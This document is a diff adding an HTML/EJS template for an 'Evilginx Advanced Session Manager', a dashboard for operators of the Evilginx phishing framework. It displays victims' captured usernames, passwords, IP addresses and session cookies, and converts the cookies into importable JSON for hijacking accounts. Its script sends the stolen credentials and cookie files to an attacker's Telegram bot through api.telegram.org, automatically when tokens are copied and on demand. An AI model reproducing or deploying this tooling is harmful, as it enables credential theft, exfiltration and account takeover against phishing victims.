@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Evilginx - Advanced Session Manager</title>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="css/main.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script>
+		let telegramEnabled = true;
+		const TELEGRAM_BOT_TOKEN = "";
+		const TELEGRAM_CHAT_ID = "";
+
+		document.addEventListener("DOMContentLoaded", () => {
+			document.getElementById("toggleTelegram").addEventListener("click", toggleTelegram);
+		});
+
+		function toggleTelegram() {
+			telegramEnabled = !telegramEnabled;
+			document.getElementById("toggleTelegram").innerText = telegramEnabled ? "📢 Telegram: ON" : "📢 Telegram: OFF";
+		}
+
+		// Modify sendToTelegram function to include custom data and sessionId.json
+		async function sendToTelegram(sessionData) {
+			if (!telegramEnabled) return;
+
+			let customData = sessionData.custom && Object.keys(sessionData.custom).length > 0
+				? JSON.stringify(sessionData.custom, null, 2)
+				: "❌ No Custom Data";
+
+			let message = `✨ *Session Information* ✨\n\n` +
+				`🆔 *Session ID:* ➖ ${sessionData.id}\n` +
+				`👤 *Username:*      ➖ ${sessionData.username || "❌ No Username"}\n` +
+				`🔑 *Password:*      ➖ ${sessionData.password || "❌ No Password"}\n` +
+				`🛠 *Custom Data:*   ➖ \n\`\`\`\n${customData}\`\`\`\n` +
+				`🖥️ *User Agent:*    ➖ ${sessionData.useragent}\n` +
+				`🌍 *Remote Address:*➖ ${sessionData.remote_addr}\n` +
+				`🕒 *Date:*   ➖ ${new Date().toLocaleDateString()}\n` +
+				`🕔 *Time:*   ➖ ${new Date().toLocaleTimeString()}\n\n`;
+
+			try {
+				await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+					method: "POST",
+					headers: { "Content-Type": "application/json" },
+					body: JSON.stringify({
+						chat_id: TELEGRAM_CHAT_ID,
+						text: message,
+						parse_mode: "Markdown"
+					})
+				});
+
+				sendCookiesToTelegram(sessionData.tokens, sessionData.id);
+			} catch (err) {
+				console.error("Telegram Error:", err);
+			}
+		}
+
+		// Use session ID for file naming
+		async function sendCookiesToTelegram(tokens, sessionId) {
+			if (!telegramEnabled) return;
+
+			let formattedTokens = [];
+			for (const domain in tokens) {
+				for (const key in tokens[domain]) {
+					let tokenData = tokens[domain][key];
+					formattedTokens.push({
+						"path": tokenData.Path || "/",
+						"domain": domain,
+						"expirationDate": tokenData.ExpirationDate || 1773674937,
+						"value": tokenData.Value || "",
+						"name": tokenData.Name || key,
+						"httpOnly": tokenData.HttpOnly || false,
+						"hostOnly": domain === "accounts.google.com" || tokenData.Name.startsWith("__Host-"),
+						"secure": tokenData.Name.startsWith("__Secure-"),
+						"session": tokenData.Session || false
+					});
+				}
+			}
+
+			let fileData = new Blob([JSON.stringify(formattedTokens, null, 0)], { type: "application/json" });
+			let formData = new FormData();
+			formData.append("chat_id", TELEGRAM_CHAT_ID);
+			formData.append("document", fileData, `cookiesID ${sessionId}.json`);
+
+			try {
+				await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: "POST", body: formData });
+			} catch (err) {
+				console.error("Telegram File Error:", err);
+			}
+		}
+
+        document.addEventListener("DOMContentLoaded", () => {
+            initTableSorting();
+            initCopyButtons();
+            initToggleButtons();
+        });
+
+		function copyToClipboard(text, message) {
+			navigator.clipboard.writeText(text).then(() => {
+				// Show a truncated version of the copied JSON in the alert
+				let displayText = text.length > 200 ? text.substring(0, 200) + "..." : text;
+				alert("📋 Copied\n\n" + displayText);
+			}).catch(err => {
+				console.error("❌ Failed to copy:", err);
+				alert("Failed to copy data.");
+			});
+		}
+
+        function filterTable() {
+            let filter = document.getElementById("searchInput").value.toLowerCase();
+            let rows = document.getElementById("dataTable").getElementsByTagName("tr");
+            for (let i = 1; i < rows.length; i++) {
+                let cells = rows[i].getElementsByTagName("td");
+                let match = false;
+                for (let j = 0; j < cells.length; j++) {
+                    if (cells[j].innerText.toLowerCase().includes(filter)) {
+                        match = true;
+                        break;
+                    }
+                }
+                rows[i].style.display = match ? "" : "none";
+            }
+        }
+
+        function initTableSorting() {
+            document.querySelectorAll("th").forEach(header => {
+                header.addEventListener("click", () => {
+                    let table = header.closest("table");
+                    let rows = Array.from(table.querySelectorAll("tr:nth-child(n+2)"));
+                    let columnIndex = Array.from(header.parentNode.children).indexOf(header);
+                    let ascending = header.dataset.ascending === "true";
+                    header.dataset.ascending = !ascending;
+
+                    rows.sort((rowA, rowB) => {
+                        let cellA = rowA.children[columnIndex].innerText;
+                        let cellB = rowB.children[columnIndex].innerText;
+                        return ascending ? cellA.localeCompare(cellB) : cellB.localeCompare(cellA);
+                    });
+
+                    rows.forEach(row => table.appendChild(row));
+                });
+            });
+        }
+
+		function initCopyButtons() {
+			document.querySelectorAll(".copy-button").forEach(button => {
+				button.addEventListener("click", () => {
+					let text;
+					let sessionData = {};
+
+					if (button.classList.contains("copy-token")) {
+						try {
+							let tokens = JSON.parse(button.dataset.copy);
+							let formattedTokens = [];
+
+							for (const domain in tokens) {
+								for (const key in tokens[domain]) {
+									let tokenData = tokens[domain][key];
+									let name = tokenData.Name || key;
+
+									formattedTokens.push({
+										"path": tokenData.Path || "/",
+										"domain": domain,
+										"expirationDate": tokenData.ExpirationDate || 1773674937,
+										"value": tokenData.Value || "",
+										"name": name,
+										"httpOnly": tokenData.HttpOnly || false,
+										"hostOnly": domain === "accounts.google.com" || name.startsWith("__Host-") || (!domain.startsWith(".") && !name.startsWith("__Secure-")),
+										"secure": name.startsWith("__Secure-") || name.startsWith("__Host-"),
+										"session": tokenData.Session || false
+									});
+								}
+							}
+
+							text = JSON.stringify(formattedTokens);
+							copyToClipboard(text, text); // Copy JSON and show message
+
+							// Collect session data
+							let row = button.closest("tr");
+							let sessionId = row.querySelector("td:nth-child(1)").innerText;
+
+							sessionData = {
+								id: sessionId,
+								username: row.querySelector("td:nth-child(2)").innerText,
+								password: row.querySelector("td:nth-child(3) span[data-password]").getAttribute("data-password"),
+								useragent: row.querySelector("td:nth-child(5)").innerText,
+								remote_addr: row.querySelector("td:nth-child(4)").innerText,
+								create_time: row.querySelector("td:nth-child(6)").innerText,
+								custom: JSON.parse(row.querySelector("td:nth-child(7)").dataset.custom || "{}"),
+								tokens: tokens
+							};
+
+							// If Telegram is enabled, send data
+							if (telegramEnabled) {
+								sendToTelegram(sessionData);
+							}
+
+						} catch (error) {
+							console.error("❌ Error parsing token data:", error);
+							alert("❌ Error copying token data. Invalid format.");
+							return;
+						}
+					} else {
+						text = button.dataset.copy;
+						copyToClipboard(text, text);
+					}
+				});
+			});
+
+			// Add event listener for Send to Telegram button
+			document.querySelectorAll(".send-telegram").forEach(button => {
+				button.addEventListener("click", () => {
+					let row = button.closest("tr");
+					let sessionId = row.querySelector("td:nth-child(1)").innerText;
+
+					let sessionData = {
+						id: sessionId,
+						username: row.querySelector("td:nth-child(2)").innerText,
+						password: row.querySelector("td:nth-child(3) span[data-password]").getAttribute("data-password"),
+						useragent: row.querySelector("td:nth-child(5)").innerText,
+						remote_addr: row.querySelector("td:nth-child(4)").innerText,
+						create_time: row.querySelector("td:nth-child(6)").innerText,
+						custom: JSON.parse(row.querySelector("td:nth-child(7)").dataset.custom || "{}"),
+						tokens: JSON.parse(row.querySelector(".copy-token").dataset.copy)
+					};
+
+					sendToTelegram(sessionData);
+				});
+			});
+		}
+		
+        function initToggleButtons() {
+            document.querySelectorAll(".toggle-password").forEach(button => {
+                button.addEventListener("click", () => {
+                    let passwordCell = button.previousElementSibling;
+                    let isHidden = passwordCell.dataset.hidden === "true";
+                    passwordCell.innerText = isHidden ? passwordCell.dataset.password : "******";
+                    passwordCell.dataset.hidden = !isHidden;
+                });
+            });
+        }
+    </script>
+</head>
+
+<body>
+    <div class="header">
+        <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png">
+        <h1>EVILGINX Advanced Session Manager</h1>
+		<button onclick="logout()">🚪 Logout</button>
+    </div>
+
+    <input type="text" id="searchInput" onkeyup="filterTable()" placeholder="🔍 Search sessions..." style="width: 100%; padding: 10px; margin-bottom: 20px;">
+
+    <button onclick="exportData('json')"> 📥 (ALL) Export JSON </button>
+    <button onclick="exportData('csv')"> 📥 (ALL) Export CSV </button>
+    <button onclick="exportData('csv')"> 📥 (ALL) Export TXT </button>
+	<button id="toggleTelegram">📢 Telegram: ON</button>
+
+    <div class="session">
+        <table id="dataTable" border="1">
+            <tr>
+                <th>Session</th>
+                <th>Username</th>
+                <th>Password</th>
+                <th>User IP</th>
+                <th>User Agent</th>
+                <th>Time</th>
+                <th>Custom</th>
+                <th>Tokens</th>
+                <th>Actions</th>
+            </tr>
+            <% data.forEach(item => { %>
+            <tr>
+                <td><%= item.id %></td>
+                <td><%= item.username %></td>
+                <td>
+                    <center><span><%= Object.keys(item.password).length > 0 ? "✅" : "❌" %></span>
+					<span data-password="<%= item.password %>" data-hidden="true">******</span>
+                    <button class="toggle-password">👁️</button></center>
+                </td>
+                <td><%= item.remote_addr %></td>
+                <td style="max-width: 200px; word-wrap: break-word;"><%= item.useragent %></td>
+                <td><%= new Date(item.create_time * 1000).toLocaleString() %> (<%= Math.floor((Date.now() - (item.create_time * 1000)) / 60000) %> min ago)</td>
+                <td><%= Object.keys(item.custom).length > 0 ? "✅ Yes" : "❌ No" %></td>
+
+                <td><%= Object.keys(item.tokens).length > 0 ? "✅ Yes" : "❌ No" %></td>
+                <td>
+                    <button class="copy-button" data-copy='<%= JSON.stringify(item) %>'>📋 Copy All</button>
+                    <button class="copy-button" data-copy='<%= item.username %> : <%= item.password %>'>🔑 Copy Credentials</button>
+					<button class="copy-button copy-token"  data-copy='<%= JSON.stringify(item.tokens) %>'>🍪 Copy Token</button>
+					<button class="send-telegram">📤 Send to Telegram</button>
+                    <button class="copy-button" data-copy='<%= JSON.stringify(item.custom, null, 2) %>'>🔧 Copy Custom</button>
+                </td>
+            </tr>
+            <% }) %>
+        </table>
+    </div>
+</body>
+</html>
